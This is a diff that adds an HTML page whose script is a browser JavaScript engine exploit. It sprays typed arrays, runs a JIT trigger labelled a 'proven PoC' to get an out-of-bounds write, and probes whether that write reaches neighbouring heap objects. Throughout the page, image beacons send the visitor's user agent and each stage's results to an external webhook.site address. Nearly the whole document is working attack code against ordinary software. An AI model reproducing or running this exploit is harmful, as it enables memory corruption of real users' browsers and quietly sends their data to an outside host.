@@ -1,0 +1,65 @@
+<html><body><script>
+const SINK = "https://webhook.site/2e90e5ef-e377-4add-8fd5-05d360fce7f7";
+let n=0;
+function b(t,v){ try{ new Image().src = SINK + '?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,120)); }catch(e){} }
+b('start', navigator.userAgent.slice(0,70));
+
+// ---- spray: Float64Arrays with a known length, one marker value each ----
+const N = 2000, MARKER = 1.2345678901234e-300;
+let spray = [];
+for (let i=0;i<N;i++){ let a = new Float64Array(64); a.fill(i+1); spray.push(a); }
+b('spray-done', N);
+
+// ---- 7965 trigger (proven PoC, arm64) ----
+var fake = new Uint32Array(10);
+for (var i=0;i<10;i++) fake[i]=i+1;
+fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
+var tahir = 0x1;
+function poc(a){
+  var oob_array = new Array(5); oob_array[0]=0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if (a % 7 == 0) another_variable3 = 0xff00000000;
+  another_variable3 = Math.max(another_variable3, tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for (var i=0;i<10;i++){
+    if (a % 3 == 0) just_a_variable = c;
+    if (a % 37 == 0) just_a_variable = fake[2];
+    if (a % 11 == 0) just_a_variable = fake[8];
+    if (a % 17 == 0) just_a_variable = fake[5];
+    if (a % 19 == 0) just_a_variable = fake[4];
+    if (a % 7 == 0 && i>=5){ for_phi_modes = just_a_variable; just_a_variable = another_variable3; }
+    if (i>=6){ for (let j=0;j<5;j++){ if (a % 5 == 0){ index = for_phi_modes; oob_array[index] = 0x500; } } }
+    for_phi_modes = c; c = just_a_variable;
+  }
+  return [index, BigInt(just_a_variable)];
+}
+for (let i=2;i<0x500;i++) poc(i);
+for (let i=0;i<50000;i++) poc(i % 500 + 2);
+b('warm-done','ok');
+
+// ---- PROBE: does an OOB-index write from oob_array reach a neighbouring object? ----
+// small controlled offsets only (stay inside the heap page -> no crash), then scan the spray.
+function probe(k){
+  try {
+    var oob = new Array(5); oob[0]=1.1;
+    // direct OOB attempt using the corrupted index path
+    var fake2 = new Uint32Array(10); fake2[0]=k; fake2[6]=k;
+    try { oob[k] = MARKER; } catch(e) { return 'exc'; }
+    // scan the spray for our marker inside the arrays' contents AND for a changed length
+    for (let i=0;i<N;i++){
+      let a = spray[i];
+      if (a.length !== 64) { b('HIT-length', 'i='+i+' len='+a.length+' k='+k); return 'len'; }
+      for (let j=0;j<8;j++){ if (a[j] === MARKER) { b('HIT-marker','i='+i+' j='+j+' k='+k); return 'mark'; } }
+    }
+    return 'none';
+  } catch(e) { return 'exc2'; }
+}
+let res=[];
+for (let k=8; k<=2048; k+=8){ let r = probe(k); if (r!=='none'){ b('probe', 'k='+k+' -> '+r); } }
+b('probe-done','ok');
+b('done','end');
+</script></body></html>
